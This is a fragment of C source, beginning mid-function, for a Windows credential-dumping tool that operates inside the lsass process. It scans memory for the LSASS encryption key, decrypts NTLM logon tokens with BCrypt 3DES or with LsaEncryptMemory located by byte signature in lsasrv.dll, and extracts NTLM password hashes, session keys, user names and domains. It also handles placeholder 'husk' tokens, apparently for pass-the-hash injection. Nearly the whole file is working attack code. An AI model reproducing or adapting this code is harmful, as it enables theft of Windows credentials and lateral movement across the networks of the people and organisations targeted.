			if ((DWORD_PTR)ptr == (DWORD_PTR)((DWORD_PTR)page + 0x1000)) {
				break;
			}

			if (IsBadReadPtr((PVOID)((DWORD_PTR)ptr - PRIMARY_STRING_DELTA), sizeof(token_string))) {
				ptr++;
				continue;
			}

			if (memory_compare((PDWORD)ptr, (PDWORD)token_string, sizeof(token_string))) {
				ptr++;
				continue;
			}

			//BREAK;

			if ((DWORD_PTR)(*(DWORD_PTR *)((DWORD_PTR)ptr - PRIMARY_STRING_DELTA)) != (DWORD_PTR)ptr) {
				ptr++; 
				continue;
			}

			//DEBUG("+lsass> Primary string @ 0x%08x 0x%08x 0x%08x", ptr, memory_basic_information.BaseAddress, memory_basic_information.RegionSize);

			if (!lsass_extract_hash_from_token(&token_structure[token_structure_counter], (PCHAR)ptr)) {
				// Invalid token

#ifdef DEBUG_OUT
				DEBUG("+lsass> Invalid NULL token");
#endif

				ptr++;
				continue;
			}
			*/
			/*
#ifdef DEBUG_OUT
			DEBUG("+lsass> Extracting hash");
#endif
			lsass_extract_hash_from_token(&ntlm_token, (char *)ptr);

			// Check if this is a NULL session token
#ifdef DEBUG_OUT
			DEBUG("+lsass> Checking for invalid session");
#endif
			for (i = 0; i < NTLM_SESSION_LENGTH; i++) {
				if (*(PBYTE)(&ntlm_token->session[i]) != 0) {
					break;
				}
			}
			DEBUG("+lsass> Checking for invalid session");
			if (i != NTLM_SESSION_LENGTH) {
				// This token is OK to use

				token_structure[token_structure_counter] = ntlm_token;

				token_structure_counter++;
				ptr++;

				//DEBUG("+lsass> Next page");
				continue;
			}

			// This is an invalid session 0 token
#ifdef DEBUG_OUT
			DEBUG("+lsass> Removing session 0 token");
#endif
			HeapFree(ntlm_token->heap, 0, ntlm_token->raw_token);
			HeapDestroy(ntlm_token->heap);
			ntlm_token = NULL;

			ptr++;
			*/
	/*
			token_structure_counter++;
			ptr++;
		}

		page = (PBYTE)((DWORD)page + 0x1000);
	}

#ifdef DEBUG_OUT
	DEBUG("+lsass> Token enumeration complete");
#endif

	return;
	*/
}
#pragma optimize("", on)

/*
typedef struct ntlm_token {
	DWORD		*raw_token;				// pointer inside lsass's memory
	DWORD		*decrypted_token;		// pointer within the new (decrypted) buffer
	char		*primary_string;		// pointer inside lsass's memory
	BYTE		ntlm[16];
	BYTE		session[16];
	char		*domain;				// pointer within the new (decrypted) buffer
	char		*user;					// pointer within the new (decrypted) buffer
	HANDLE		heap;
} NTLM_TOKEN, *PNTLM_TOKEN;
*/

VOID lsass_get_secret(PBYTE secret_out)
{
	PNTLM_TOKEN						local_token;
	HANDLE							token_heap = INVALID_HANDLE_VALUE;
	MEMORY_BASIC_INFORMATIONX		memory_basic_information					= {0};
	PDWORD							ptr, page = NULL;
	UINT							i;
	PDWORD							output;
	BYTE							key_offset;

	// Do we already have a key?
	if ((DWORD)*secret_glob != (DWORD)0x00000000) {
		CopyMemory(secret_out, secret_glob, SECRET_PHYSICAL_SIZE);
		return;
	}

	// Check if we're running the correct OS
#ifdef DEBUG_OUT
	DEBUG("+lsass> Looking for secret...");
#endif
	key_offset = lsass_get_key_offset();
	if (key_offset == 0) {
		return;
	}

	while (TRUE) {
		// Iterate through memory looking for a MEM_PRIVATE page
		page = (PDWORD)((DWORD_PTR)page + memory_basic_information.RegionSize);
		ZeroMemory((void *)&memory_basic_information, sizeof(MEMORY_BASIC_INFORMATIONX));
		if (!VirtualQuery(page, &memory_basic_information, sizeof(MEMORY_BASIC_INFORMATIONX))) {
			break;
		}

#ifdef DEBUG_OUT
		//DEBUG("+lsass> Private 0x%08x", page);
#endif

		if ((DWORD_PTR)page > SECRET_MAX_PAGE_ADDRESS) {
			ZeroMemory(secret_out, SECRET_PHYSICAL_SIZE);
			return;
		}

		if ((memory_basic_information.Type != MEM_PRIVATE) || (memory_basic_information.State != MEM_COMMIT)) {
			continue;
		}

#ifdef DEBUG_OUT
		//DEBUG("+lsass> Private 0x%08x", page);
#endif

		//DEBUG(">>> [lsass] <<< Found MEM_PRIVATE page @ 0x%08x!", page);
		//Sleep(5);

		// We found a private memory page
		for (i = 0; i < (memory_basic_information.RegionSize - 0x64); i++) {

			// Check if there is a read error
			if (IsBadReadPtr((const void *)((DWORD)page + i), 4)) {
				break;
			}

			if (*(PDWORD)((DWORD_PTR)page + i) == 0x55555552) {

				//BREAK;

				// Set ptr to signature
				ptr = (PDWORD)((DWORD_PTR)page + i);

				//DEBUG("0x%08x", ptr);

				// Move to the base
				ptr = (PDWORD)((DWORD_PTR)ptr - 4);

				if (*(PDWORD)((DWORD_PTR)ptr + 0x28) != 0x00010005) {
					continue;
				}
				
				ZeroMemory(secret_out, SECRET_PHYSICAL_SIZE);
				CopyMemory(secret_out, (PVOID)((DWORD_PTR)ptr + key_offset), SECRET_PHYSICAL_SIZE);
				CopyMemory(secret_glob, (PVOID)((DWORD_PTR)ptr + key_offset), SECRET_PHYSICAL_SIZE);
#ifdef DEBUG_OUT
				DEBUG("+lsass> Obtained Secret");
#endif

				return;
			}
		}
		/*
		for (i = 0; i < (memory_basic_information.RegionSize - 16); i++) {

			// If there's some error
			if (IsBadReadPtr(ptr, 4)) {
				break;
			}

			if (*ptr == 0x55555552) {
				DEBUG("0x%08x", ptr);
				BREAK;

				// Get us to the base address
				ptr = (PDWORD)((DWORD)ptr - 4);

				if (*(PDWORD)((DWORD)ptr + 0x28) != 0x00010005) {
					ptr = (PDWORD)((DWORD)ptr + 1);
					continue;
				}

				ZeroMemory(secret_out, 24);
				CopyMemory(secret_out, (void *)((DWORD)ptr + key_offset), 24);
				CopyMemory(secret_glob, (void *)((DWORD)ptr + key_offset), 24);

				//DEBUG(">>> [lsass] <<< Found secret @ 0x%08x!", secret_out);

				ptr++;
			}

			ptr = (PDWORD)((DWORD)ptr + 1);
		}*/
	}

	return;
}

BOOL lsass_extract_hash_from_token(PNTLM_TOKEN *token_structure, PCHAR primary_token)
{
	NTLM_TOKEN						*local_token;
	HANDLE							token_heap							= INVALID_HANDLE_VALUE;
	MEMORY_BASIC_INFORMATION		memory_basic_information			= {0};
	DWORD							*ptr, *page = NULL;
	UINT							i;
	BYTE							secret[24]							= {0};

	BYTE							*ptr2								= NULL;

	// bcrypt
	ERROR_CODE						status;
	BCRYPT_ALG_HANDLE				algorithm_handle					= NULL;
	BCRYPT_KEY_HANDLE				key_handle;
	DWORD							key_object							= 0;
	DWORD							property_result						= 0;
	PUCHAR							sym_key_data						= NULL;
	BYTE							iv[8]								= {0};

	DWORD							version, version_major, version_minor;

	CHAR							output_string[256];
	CHAR							b, d;
	INT								junk;

	// Determine version.
	// If this is Vista, we must look for LsaEncryptMemory (similar to XP)
	// If this is 7, continue on.
	version = GetVersion();
	version_major = (DWORD)(LOBYTE(LOWORD(version)));
	version_minor = (DWORD)(HIBYTE(LOWORD(version)));
	if ((version_major == 6) && (version_minor == 0)) {
		return lsass_extract_hash_from_token_vista(token_structure, primary_token);
	}

	// Allocate memory to the token structure
	token_heap		= HeapCreate(0, 0, 0x1000);
	if (token_heap == INVALID_HANDLE_VALUE) {
#ifdef DEBUG_OUT
		DEBUG("!lsass> Failed to allocate token heap memory");
#endif
		return FALSE;
	}

	local_token = (PNTLM_TOKEN)HeapAlloc(token_heap, 0, sizeof(NTLM_TOKEN));
	if (token_structure == INVALID_HANDLE_VALUE) {
#ifdef DEBUG_OUT
		DEBUG("!lsass> Failed to allocate token structure memory in valid heap");
#endif
		return FALSE;
	}

	// Prepare the token structure
	ZeroMemory((PVOID)token_structure, sizeof(NTLM_TOKEN));

	local_token->heap				= token_heap;
	local_token->raw_token			= (PDWORD)((DWORD)primary_token + 8);
	local_token->primary_string		= primary_token;

	// Try and obtain the secret
	//DEBUG(">>> [lsass] <<< Looking for a key");
	lsass_get_secret(secret);
	if (*secret == (DWORD)0) {
		// We're probably using the incorrect OS version.. FIXME ?
#ifdef DEBUG_OUT
		DEBUG("!lsass> Failed to get the LSASS secret!", status);
		BREAK;
#endif

		return FALSE;
	}

	// Begin the decryption mechinism
	status = BCryptOpenAlgorithmProvider(&algorithm_handle, BCRYPT_3DES_ALGORITHM, NULL, 0);
	if (status != STATUS_SUCCESS) {
#ifdef DEBUG_OUT
		DEBUG("!lsass> BCryptOpenAlgorithmProvider failed 0x%08x", status);
#endif
		return FALSE;
	}

	// Set property on algorithm
	status = BCryptSetProperty(algorithm_handle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (status != STATUS_SUCCESS) {
#ifdef DEBUG_OUT
		DEBUG("!lsass> BCryptSetProperty failed 0x%08x", status);
#endif
		return FALSE;
	}

	// Get property
	status = BCryptGetProperty(	algorithm_handle, 
									BCRYPT_OBJECT_LENGTH, 
									(PBYTE)&key_object, 
									sizeof(DWORD), 
									&property_result, 
									0);
	if (status != STATUS_SUCCESS) {
#ifdef DEBUG_OUT
		DEBUG("!lsass> BCryptGetProperty failed 0x%08x", status);
#endif
		return FALSE;
	}

	// Allocate memory for sym key
	sym_key_data = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, (DWORD)key_object);
	ZeroMemory(sym_key_data, key_object);

	// Generate key
	status = BCryptGenerateSymmetricKey(	algorithm_handle, 
											&key_handle,
											sym_key_data,
											key_object,
											secret,
											sizeof(secret),
											0);									
									
	if (status != STATUS_SUCCESS) {	
#ifdef DEBUG_OUT
		DEBUG("!lsass> Generating symmetric key failed 0x%08x", status);
#endif
		return FALSE;
	}

	local_token->decrypted_token = (PDWORD)HeapAlloc(local_token->heap, 0, NTLM_TOKEN_6_SIZE);

	// Get size of output buffer
	status = BCryptDecrypt(	key_handle,
								(PUCHAR)local_token->raw_token,
								NTLM_TOKEN_6_SIZE,
								NULL,
								iv,
								sizeof(iv),
								(PUCHAR)local_token->decrypted_token,
								NTLM_TOKEN_6_SIZE,
								(PULONG)&junk,
								0);							
						
	if (status != STATUS_SUCCESS) {
#ifdef DEBUG_OUT
		DEBUG("!lsass> Decryption Failed 0x%08x", status);
#endif
		return FALSE;
	} else {
		//DEBUG(">>> [lsass] <<< Decrypted buffer @ 0x%08x", local_token->decrypted_token);
	}

	// Setup pointers
	//BREAK;
	local_token->ntlm		= (PBYTE)((DWORD_PTR)local_token->decrypted_token + TOKEN_OFFSET_NTLM);
	local_token->session	= (PBYTE)((DWORD_PTR)local_token->decrypted_token + TOKEN_OFFSET_SESSION);
	local_token->domain		= (wchar_t *)((DWORD_PTR)local_token->decrypted_token + TOKEN_OFFSET_DOMAIN);
	local_token->user		= (wchar_t *)(*(PDWORD)((DWORD_PTR)local_token->decrypted_token + TOKEN_OFFSET_USER) + (DWORD_PTR)local_token->decrypted_token);

	// Print out token info
#ifdef DEBUG_OUT
#ifdef DEBUG_PRINT_ALL_TOKENS
	DEBUG("+lsass> Token Information:");

	// Print out user
	DEBUGw(local_token->user);
	DEBUGw(local_token->domain);

	// NTLM
	ZeroMemory(output_string, sizeof(output_string));
	for (i = 0; i < NTLM_HASH_SIZE; i++) {
		get_byte_hex(local_token->ntlm[i], &b, &d);

		output_string[i * 2] = b;
		output_string[i * 2 + 1] = d;
	}
	DEBUG(output_string);

	// Session
	ZeroMemory(output_string, sizeof(output_string));
	for (i = 0; i < NTLM_HASH_SIZE; i++) {
		get_byte_hex(local_token->session[i], &b, &d);

		output_string[i * 2] = b;
		output_string[i * 2 + 1] = d;
	}
	DEBUG(output_string);
#endif
#endif

	// Test  NULL session 0 hash
	//DEBUG("+lsass> .");
	for (i = 0; i < NTLM_SESSION_LENGTH; i++) {
		if (*(PBYTE)((DWORD_PTR)local_token->ntlm + (UINT)i)) {
			break;
		}
	}

	//DEBUG("+lsass> .");
	if (i == NTLM_SESSION_LENGTH) {
		// Invalid token
		//*token_structure = (PNTLM_TOKEN)NULL;

		// Free memory
		HeapFree(local_token->heap, 0, local_token->decrypted_token);
		HeapDestroy(local_token->heap);
		//local_token = (PNTLM_TOKEN)NULL; //FIXME

		// Cleanup
		BCryptDestroyKey(key_handle);
		BCryptCloseAlgorithmProvider(algorithm_handle, 0);
		HeapFree(GetProcessHeap(), 0, sym_key_data);

		return FALSE;
	}

	// Valid token
	*token_structure = local_token;

	// Cleanup
	BCryptDestroyKey(key_handle);
	BCryptCloseAlgorithmProvider(algorithm_handle, 0);
	HeapFree(GetProcessHeap(), 0, sym_key_data);
/*
007B05B8  0D614380  €Ca.	00
007B05BC  97AD4B10  K­—		04
007B05C0  00140012  ..		08
007B05C4  00000060  `...	12		// offset to username
007B05C8  54AC2B04  +¬T		16	session
007B05CC  B3A514EE  î¥³		20
007B05D0  80B5DE4F  OÞµ€	24
007B05D4  BA724A5B  [Jrº	28
007B05D8  00000000  ....	32	ntlm
007B05DC  00000000  ....	36
007B05E0  00000000  ....	40
007B05E4  00000000  ....	44
007B05E8  2BE4A824  $¨ä+	48
007B05EC  A8F30F8B  ‹ó¨		52
007B05F0  DEBAD772  r×ºÞ	56
007B05F4  A9353879  y85©	60
007B05F8  FA4BE8F6  öèKú	64
007B05FC  00010001  ..		68
007B0600  004F004C  L.O.	72
007B0604  00410043  C.A.	76
007B0608  0044004C  L.D.	80
007B060C  004D004F  O.M.	84
007B0610  00490041  A.I.	88
007B0614  0000004E  N...	92
007B0618  00490057  W.I.	96
007B061C  0037004E  N.7.	100
007B0620  00450054  T.E.	104
007B0624  00540053  S.T.	108
007B0628  00000024  $...	112
007B062C  00000000  ....	116



00230000  00000014
00230004  55555552
00230008  003CBD88
0023000C  00230020
00230010  00000000
00230014  00000000
00230018  00000000
0023001C  00000000
00230020  000001BC
00230024  4D53534B
00230028  00010005
0023002C  00000001
00230030  00000008
00230034  000000A8
00230038  00000018
0023003C  D5A416C4
00230040  BBB20596
00230044  E59BFF76
00230048  D8CF7776
0023004C  B02DC73A
00230050  58AC06BB
00230054  741C30E8
00230058  8081C5C4
*/

	return TRUE;
}


VOID lsass_sort_tokens(PNTLM_TOKEN ntlm_tokens[MAX_TOKENS], PDWORD used_tokens, PDWORD used_husk_tokens)
{
	int			i;
	DWORD		*ptr_t, *ptr_h;
	DWORD		*shift0, *shift1;

	BYTE		fake_ntlm_pass[NTLM_HASH_SIZE] = {	0x41, 0x41, 0x41, 0x41,
													0x41, 0x41, 0x41, 0x41,
													0x41, 0x41, 0x41, 0x41,
													0x41, 0x41, 0x41, 0x41 };

	// Nothing to be done?
	if ((*used_tokens == 0) || (*used_husk_tokens == 0)) {
		return;
	}


	i = 0;
	while (ntlm_tokens[i] != NULL) {
		ptr_t = used_tokens;

		while (TRUE) {
			if (ntlm_tokens[i] == NULL) return;
			
			// Check for used token
			if ((DWORD)ntlm_tokens[i]->raw_token == *ptr_t) {
				//DEBUG("Freeing token 0x%08x", (DWORD)ntlm_tokens[i]->raw_token);

				HeapFree(ntlm_tokens[i]->heap, 0, ntlm_tokens[i]->decrypted_token);
				HeapFree(ntlm_tokens[i]->heap, 0, ntlm_tokens[i]);

				// Shift up
				shift0 = (PDWORD)&ntlm_tokens[i];
				shift1 = (PDWORD)&ntlm_tokens[i + 1];

				while (TRUE) {

					*shift0 = *shift1;
					*shift1 = 0;

					shift0++;
					shift1++;

					if (*shift1 == 0) break;
				}

				i = -1;
				break;
			}

			ptr_t++;

			if (*ptr_t == 0) {
				break;
			}

		}
		i++;
	}

	i = 0;
	while (ntlm_tokens[i] != NULL) {
		
		if (!memory_compare(ntlm_tokens[i]->ntlm, fake_ntlm_pass, sizeof(fake_ntlm_pass))) {
			//DEBUG("Freeing husk 0x%08x", (DWORD)ntlm_tokens[i]->raw_token);

			HeapFree(ntlm_tokens[i]->heap, 0, ntlm_tokens[i]->decrypted_token);
			HeapFree(ntlm_tokens[i]->heap, 0, ntlm_tokens[i]);

			// Shift up
			shift0 = &ntlm_tokens[i];
			shift1 = &ntlm_tokens[i + 1];

			while (TRUE) {

				*shift0 = *shift1;
				*shift1 = 0;

				shift0++;
				shift1++;

				if (*shift1 == 0) break;
			}

			i = 0;
			continue;
		}



		i++;
	}

	return;
}

BYTE lsass_get_key_offset(VOID)
{
	OSVERSIONINFOW		version;

	ZeroMemory((void *)&version, sizeof(OSVERSIONINFOW));

	version.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);

	GetVersionExW(&version);

	if ((version.dwMajorVersion == 6) && (version.dwMinorVersion == 1)) {
		return (BYTE)0x3c;
	}

	if ((version.dwMajorVersion == 6) && (version.dwMinorVersion == 0)) {
		return (BYTE)0x2c;
	}

	return 0;
}

BOOL lsass_extract_hash_from_token_vista(PNTLM_TOKEN *token_structure, PCHAR primary_token)
{
	HANDLE						heap;
	NTLM_TOKEN					*ntlm_token;

	char						output_string[256];
	char						b, d;

	unsigned int				i;

	// Check if there is a valid function pointer to LsaEncryptMemory6
	if (LsaEncryptMemory6 == NULL) {
#ifdef DEBUG_OUT
		DEBUG("+lsass> Looking for LsaEncryptMemory6...");
#endif
		lsass6_find_lsaencryptmemory();

		if (LsaEncryptMemory6 != NULL) {
			
#ifdef DEBUG_OUT
		DEBUG("+lsass> Found LsaEncryptMemory6 @ 0x%08x", LsaEncryptMemory6);
#endif

		} else if (LsaEncryptMemory6 == NULL) {

#ifdef DEBUG_OUT
		DEBUG("+lsass> Failed to find LsaEncryptMemory6");
#endif

		}
	}

	// Allocate memory for token
	heap						= HeapCreate(0, 0, 0x1000);
	ntlm_token					= (PNTLM_TOKEN)HeapAlloc(heap, 0, sizeof(NTLM_TOKEN));

	// Prepare token
	ZeroMemory((void *)ntlm_token, sizeof(NTLM_TOKEN));
	ntlm_token->heap			= heap;
	ntlm_token->decrypted_token	= (PDWORD)HeapAlloc(ntlm_token->heap, 0, NTLM_TOKEN_5_SIZE);
	ZeroMemory(ntlm_token->decrypted_token, NTLM_TOKEN_5_SIZE);
	ntlm_token->primary_string	= (char *)primary_token;
	ntlm_token->raw_token		= (PDWORD)((DWORD)primary_token + 8);

	// Copy encrypted token to new buffer
	CopyMemory(ntlm_token->decrypted_token, ntlm_token->raw_token, NTLM_TOKEN_5_SIZE);

	// Decrypt token
	LsaEncryptMemory6((unsigned int *)ntlm_token->decrypted_token, NTLM_TOKEN_5_SIZE, 0);

	//DEBUG("Decrypted token: 0x%08x", ntlm_token->decrypted_token);

	// Set token pointers
	ntlm_token->ntlm			= (PBYTE)((DWORD)ntlm_token->decrypted_token + TOKEN_OFFSET_NTLM);
	ntlm_token->session			= (PBYTE)((DWORD)ntlm_token->decrypted_token + TOKEN_OFFSET_SESSION);
	ntlm_token->domain			= (wchar_t *)((DWORD)ntlm_token->decrypted_token + TOKEN_OFFSET_DOMAIN);
	ntlm_token->user			= (wchar_t *)(*(PDWORD)((DWORD)ntlm_token->decrypted_token + TOKEN_OFFSET_USER) + (DWORD)ntlm_token->decrypted_token);
	
	// Print out token info
#ifdef DEBUG_OUT
#ifdef DEBUG_PRINT_ALL_TOKENS
	DEBUG("+lsass> Token Information:");

	// Print out
	DEBUGw(ntlm_token->user);
	DEBUGw(ntlm_token->domain);

	// NTLM
	ZeroMemory(output_string, sizeof(output_string));
	for (i = 0; i < NTLM_HASH_SIZE; i++) {
		get_byte_hex(ntlm_token->ntlm[i], &b, &d);

		output_string[i * 2] = b;
		output_string[i * 2 + 1] = d;
	}
	DEBUG(output_string);

	// Session
	ZeroMemory(output_string, sizeof(output_string));
	for (i = 0; i < NTLM_HASH_SIZE; i++) {
		get_byte_hex(ntlm_token->session[i], &b, &d);

		output_string[i * 2] = b;
		output_string[i * 2 + 1] = d;
	}
	DEBUG(output_string);
#endif
#endif

	// Check if the token is a NULL session
	for (i = 0; i < NTLM_SESSION_LENGTH; i++) {
		if (*(PBYTE)((DWORD)ntlm_token->ntlm + (DWORD)i)) {
			break;
		}
	}

	//DEBUG("+lsass> .");
	if (i == NTLM_SESSION_LENGTH) {

		HeapFree(ntlm_token->heap,	0, ntlm_token->decrypted_token);
		HeapDestroy(ntlm_token->heap);

		return FALSE;
	}

	// Set NTLM struct pointer
	*token_structure = ntlm_token;

	return TRUE;
}

VOID lsass6_find_lsaencryptmemory(VOID)
{
	IMAGE_DOS_HEADER			*dos_header;
	IMAGE_NT_HEADERS			*nt_headers;
	IMAGE_SECTION_HEADER		*section_header;

	HMODULE			lsasrv;
	char			*ptr;

	int				i;

	/*
.text:73018040 8B FF                      mov     edi, edi
.text:73018042 55                         push    ebp
.text:73018043 8B EC                      mov     ebp, esp
.text:73018045 81 EC 10 01 00 00          sub     esp, 110h
.text:7301804B A1 D0 70 11 73             mov     eax, ___security_cookie
.text:73018050 33 C5                      xor     eax, ebp
.text:73018052 89 45 FC                   mov     [ebp+var_4], eax
.text:73018055 56                         push    esi
.text:73018056 8B 75 08                   mov     esi, [ebp+arg_0]
.text:73018059 85 F6                      test    esi, esi
.text:7301805B 74 53                      jz      short loc_7301
	*/

	BYTE			lsa_sig1[]		= {		0x8b, 0xff,								//mov	edi, edi
											0x55,									//push	ebp
											0x8b, 0xec,								//mov	ebp, esp
											0x81, 0xec, 0x10, 0x01, 0x00, 0x00,		//sup	esp, 110h
											0xa1									//mov	eax, __security_cookie (4 byte operand)
	};

	BYTE			lsa_sig2[]		= {		0x33, 0xc5,								//xor	eax, ebp
											0x89, 0x45, 0xfc,						//mov	[ebp + var_4], eax
											0x56,									//push	esi
											0x8b, 0x75, 0x08,						//mov	esi, [ebp + arg_0]
											0x85, 0xf6,								//test	esi, esi
											0x74, 0x53								//jz	short loc_n
	};


	lsasrv = GetModuleHandleA("lsasrv.dll");

	// Get to the text segment
	dos_header = (PIMAGE_DOS_HEADER)lsasrv;
	nt_headers = (PIMAGE_NT_HEADERS)((DWORD)dos_header + (DWORD)dos_header->e_lfanew);

	section_header = (PIMAGE_SECTION_HEADER)((DWORD)IMAGE_FIRST_SECTION(nt_headers) + sizeof(IMAGE_SECTION_HEADER));

	ptr = (char *)((DWORD)section_header->VirtualAddress + (DWORD)lsasrv);

	for (i = 0; i < section_header->SizeOfRawData; i++) {
		if (!memory_compare((PDWORD)((DWORD)ptr + i), (PDWORD)lsa_sig1, sizeof(lsa_sig1))) {
			// First sig OK, test next sig

			if (!memory_compare((PDWORD)((DWORD)ptr + i + sizeof(lsa_sig1) + 4), (PDWORD)lsa_sig2, sizeof(lsa_sig2))) {

				LsaEncryptMemory6 = (void (WINAPI *)(unsigned int *, unsigned int, unsigned int))((DWORD)ptr + i);

				return;
			}
		}
	}

	// Failure
	LsaEncryptMemory6 = (void (WINAPI *)(unsigned int *, unsigned int, unsigned int))NULL;

	return;
}